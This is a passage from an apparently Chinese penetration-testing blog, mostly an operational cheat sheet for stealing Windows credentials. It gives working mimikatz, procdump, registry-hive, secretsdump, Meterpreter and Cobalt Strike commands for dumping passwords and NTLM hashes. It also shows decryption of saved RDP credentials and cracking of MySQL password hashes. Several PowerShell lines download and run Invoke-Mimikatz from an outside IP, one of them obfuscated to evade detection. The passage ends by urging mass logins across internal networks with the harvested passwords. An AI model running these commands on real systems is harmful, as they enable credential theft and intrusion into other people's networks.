id="mimikatz-for-Win10下载："><a href="#mimikatz-for-Win10下载：" class="headerlink" title="mimikatz for Win10下载："></a>mimikatz for Win10下载：</h4><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p></blockquote><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看mimikatz可以用哪些命令，随便敲两个或者一个：</span><br><span class="line">::查看高级命令模块</span><br><span class="line">：查看基本命令</span><br><span class="line">#选定某个模块后，比如privilege之后，可以继续输入两个::查看具体用法如privilege::</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="本地非交互式凭证获取："><a href="#本地非交互式凭证获取：" class="headerlink" title="本地非交互式凭证获取："></a>本地非交互式凭证获取：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">win7:</span><br><span class="line">mimikatz.exe &quot;log logon.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h4 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0版本</span><br><span class="line">privilege::debug    </span><br><span class="line">//提升权限,提升到调试权限，才能获取到lsass.exe进程中保存的密码。另外需要有管理员权限才能提升至debug</span><br><span class="line">sekurlsa::logonpasswords    </span><br><span class="line">//抓取密码</span><br><span class="line">1.X版本</span><br><span class="line">privilege::debug    //提升权限</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   //将 sekurlsa.dll 注入到 lsass.exe 进程里</span><br><span class="line">@getLogonPasswords     //获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate#窃取、冒充令牌,获取与令牌对应的权限，该命令可以查看我们可以窃取哪些token</span><br><span class="line">lsadump::sam#列出密码凭证及用户信息,可以得到一些ntml hash </span><br><span class="line">#拿到hash后就可以尝试解析明文或者hash传递攻击</span><br><span class="line">lsadump::secrets#Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">   #获取系统密钥以解密文条目（从注册表或配置单元获取）</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">win7：可以直接获得明文密码</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::logonpasswords </span><br></pre></td></tr></table></figure><h3 id="Powershell脚本"><a href="#Powershell脚本" class="headerlink" title="Powershell脚本"></a>Powershell脚本</h3><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a><br><a href="https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1</a></p></blockquote><p>Powershell本地加载mimikatz脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span><br></pre></td></tr></table></figure><p>Powershell远程加载mimikatz脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure><p>powershell混淆:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;47.101.214&#x27;+&#x27;.85:8000/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure><p>Powershell 加载 Get-PassHashes脚本：</p><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure><h3 id="procdump-mimikatz"><a href="#procdump-mimikatz" class="headerlink" title="procdump+mimikatz"></a>procdump+mimikatz</h3><p>Procdump下载： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br>Procdump lsass  进程导出:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For 32bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">For 64bits：</span><br><span class="line">procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后使用 mimikatz  还原密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h3 id="注册表导出Hash"><a href="#注册表导出Hash" class="headerlink" title="注册表导出Hash"></a>注册表导出Hash</h3><p>reg save命令 保存注册表</p><p>HKLM是HKEY_LOCAL_MACHINE的缩写</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208072236447.png" alt="image-20220807223639163" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们解析sam.hiv需要使用system.hiv中的key，所以需要先解密system.hiv</span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure><p>impacket：</p><blockquote><p><a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line"># 如果提示找不到 Crypto 模块， 就到 pip包安装位置C:\Users\[User]\AppData\Roaming\Python\Python38\site-packages把crypto文件夹重命名为Crypto</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290811830.png" alt="image-20220729081127638"></p><h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ul><li>Hashdump</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump    //system权限的meterpreter</span><br><span class="line">set session 1</span><br><span class="line">exploit //结果保存在tmp目录下</span><br><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>Hash格式： 用户名称:RID:LM-HASH值:NTLM-HASH值</p><ul><li>Mimikatz</li></ul><p>Hashdump 使用的是 mimikatz 的部分功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz   //加载模块</span><br><span class="line">wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp    //获取用户密码的hash值</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f ::   //查询有哪些模块</span><br><span class="line">mimikatz_command -f  samdump::hashes    //从windows的sam文件中读取密码hash值</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords   //获取明文密码</span><br><span class="line">mimikatz_command -f samdump::bootkey</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msf6</span><br><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br><span class="line">creds_all  //列举系统中的明文密码</span><br><span class="line">lsa_dump_sam  //读取sam文件</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords  //kiwi_cmd命令后面接mimikatz的命令</span><br></pre></td></tr></table></figure><h3 id="CobaltStrike获取Hash"><a href="#CobaltStrike获取Hash" class="headerlink" title="CobaltStrike获取Hash"></a>CobaltStrike获取Hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h2><h3 id="1-RDP连接密码解密"><a href="#1-RDP连接密码解密" class="headerlink" title="1 RDP连接密码解密"></a>1 RDP连接密码解密</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul><li>查看本地机器本地连接过的目标机器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure><ul><li>查看本地用户此目录下是否存有RDP密码文件</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1E85A94EE31F584E484B8120E3ADA266</span><br><span class="line">9D4E7B34E2541E8AB9F716D127DFFC87</span><br><span class="line">AAAD88ECA44F5AAA1754B5E18F7EB12D</span><br><span class="line">DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">E05DBE15D38053457F3523A375594044</span><br></pre></td></tr></table></figure><ul><li>查看保存在本地的远程主机信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><ul><li>选择一个密码文件对其进行解密。</li></ul><p>此处需要记录下 guidMasterKey 的值，待会要通过 guidMasterKey 找对应的 Masterkey 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guidMasterKey      : &#123;34dc48bb-0af9-4925-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207311118273.png" alt="image-20220729082150066"></p><ul><li>根据 guidMasterKey  找到对应的 Masterkey</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290823475.png" alt="image-20220729082254297"></p><ul><li>通过 Masterkey 解密 pbData 数据，拿到明文 RDP 连接密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 </span><br><span class="line">/masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824301.png" alt="image-20220729082414076"></p><h4 id="netpass"><a href="#netpass" class="headerlink" title="netpass"></a>netpass</h4><blockquote><p><a href="https://www.nirsoft.net/x64_download_package.html">https://www.nirsoft.net/x64_download_package.html</a><br><a href="https://www.nirsoft.net/packages/x64tools.zip">https://www.nirsoft.net/packages/x64tools.zip</a>     nirsoft123!</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824401.png" alt="image-20220729082451257"></p><h4 id="Powershell脚本获取RDP连接记录"><a href="#Powershell脚本获取RDP连接记录" class="headerlink" title="Powershell脚本获取RDP连接记录"></a>Powershell脚本获取RDP连接记录</h4><blockquote><p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040700775.png" alt="image-20220804070000501"></p><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[*] Tasked beacon to run: reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[+] host called home, sent: 113 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\10.10.10.6    UsernameHint    REG_SZ    MINGY\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[*] Tasked beacon to run: dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[+] host called home, sent: 89 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C883-5B4B</span><br><span class="line"> C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          .</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          ..</span><br><span class="line">2020/09/04  13:24               434 8CAC243098BA9DDD4EAB58433B85D7F0</span><br><span class="line">   1 个文件            434 字节</span><br><span class="line">               2 个目录 56,959,107,072 可用字节</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell cmdkey /list</span><br><span class="line">[*] Tasked beacon to run: cmdkey /list</span><br><span class="line">[+] host called home, sent: 43 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">当前保存的凭据:</span><br><span class="line">    目标: Domain:target=TERMSRV/10.10.10.6</span><br><span class="line">    类型: 域密码</span><br><span class="line">    用户: WIN7-1\administrator</span><br><span class="line">    本地机器持续时间</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=MINGY\WIN7-1</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: MINGY\WIN7-1</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=WIN7-1\Administrator</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: WIN7-1\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\8CAC243098BA9DDD4EAB58433</span><br><span class="line">B85D7F0&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h3 id="2-Mysql数据库密码破解"><a href="#2-Mysql数据库密码破解" class="headerlink" title="2 Mysql数据库密码破解"></a>2 Mysql数据库密码破解</h3><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。<br>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取<br>一般都包含有<strong>数据库类型，物理位置，用户名和密码</strong>等信息</p><h4 id="1、MYSQL数据库文件类型"><a href="#1、MYSQL数据库文件类型" class="headerlink" title="1、MYSQL数据库文件类型"></a>1、MYSQL数据库文件类型</h4><p>MYSQL数据库文件共有 frm 、 MYD 和 MYI 三种文件</p><ul><li>“.frm” 是描述表结构的文件</li><li>“.MYD” 是表的数据文件</li><li>“.MYI” 是表数据文件中任何索引的数据树</li></ul><p>一般是单独存在一个文件夹中<br>与用户有关的一共有三个文件即 user.frm 、 user.MYD 和 user.MYI ，MYSQL数据库用户密码都保存在 user.MYD 文件中，包括root用户和其他用户的密码。</p><h4 id="2、Mysql加密方式"><a href="#2、Mysql加密方式" class="headerlink" title="2、Mysql加密方式"></a>2、Mysql加密方式</h4><p>MYSQL数据库的认证密码有两种方式<br>MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密<br>MYSQL数据库中自带 Old_Password(str)  和 Password(str) 函数,它们均可以在MYSQL数据库里进行查询，前者是 MYSQL323 加密，后者是 MYSQLSHA1 方式加密。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select Password(&#x27;root&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| Password(&#x27;root&#x27;)                          |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>MYSQL323 加密中生成的是16位字符串，而在 MYSQLSHA1 中生成的是41位字符串，其中 * 是不加入实际的密码运算中， MYSQLSHA1 加密的密码的实际位数是40位</p><h4 id="3、获取Mysql数据库密码hash值"><a href="#3、获取Mysql数据库密码hash值" class="headerlink" title="3、获取Mysql数据库密码hash值"></a>3、获取Mysql数据库密码hash值</h4><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040710562.png" alt="image-20220804071007319"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><h4 id="4、Hash破解"><a href="#4、Hash破解" class="headerlink" title="4、Hash破解"></a>4、Hash破解</h4><ul><li>在线网站破解</li></ul><blockquote><p><a href="http://www.cmd5.com/">www.cmd5.com</a><br><a href="http://www.somd5.com/">www.somd5.com</a></p></blockquote><ul><li>hashcat破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m 300 -a 3 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040711282.png" alt="image-20220804071121105"></p><ul><li>john the ripper破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --list=format | grep mysql</span><br><span class="line">john --format=mysql-sha1 mysql.hash</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712296.png" alt="image-20220804071203110"></p><ul><li>Cain破解</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712139.png" alt="image-20220804071219948"></p><h3 id="3-其他应用程序密码破解"><a href="#3-其他应用程序密码破解" class="headerlink" title="3 其他应用程序密码破解"></a>3 其他应用程序密码破解</h3><blockquote><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p></blockquote><p>对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。</p><blockquote><p>源码：<a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a></p></blockquote><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>见后面域内横向移动那一节~~</p><h1 id="关于Windows的其他知识"><a href="#关于Windows的其他知识" class="headerlink" title="关于Windows的其他知识"></a>关于Windows的其他知识</h1><ol><li>域内账户登录和本机登录的区别</li></ol><p>域内登录需要带上域的域名如GUNGNIR\bob</p><p>当服务器安装完域控制器相关组建后后，这台机器就被提升为域控，本地的administrator账户会被提升为域内的管理员账户。</p><p>域内主机登录本地账户呢 需要以主机名\用户名的形式，比如说一台名为WEB的主机的本地administrator用户是以WEB\administrator形式登录，亦或者.\administrator</p><ol start="2"><li>关于我们获取到内网的一台主机的密码和hash后，我们可以去找脚本或者自己写，使用密码批量登录内网网段的机器，很大概率能拿下很多机器</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Windows认证机制 </tag>
            
            <tag> 凭证获取 </tag>
            
            <tag> NTLM </tag>
            
            <tag> 票据伪造原理 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 域认证 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
